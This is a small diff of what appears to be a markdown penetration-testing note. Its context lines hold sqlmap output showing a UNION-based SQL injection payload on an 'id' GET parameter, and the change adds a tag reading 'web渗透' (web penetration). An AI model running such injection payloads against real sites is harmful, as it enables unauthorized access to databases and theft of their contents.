@@ -17,6 +17,7 @@ Parameter: id (GET)
     Type: UNION query
     Title: Generic UNION query (NULL) - 2 columns
     Payload: id=-6758' UNION ALL SELECT NULL,CONCAT(0x71716b6271,0x6b4f427268554c41585a6c62706e70755161624c684e6b574950737365477945575762454c567758,0x71627a6a71)-- -
+tags: [web渗透]
 ---
 ```
 
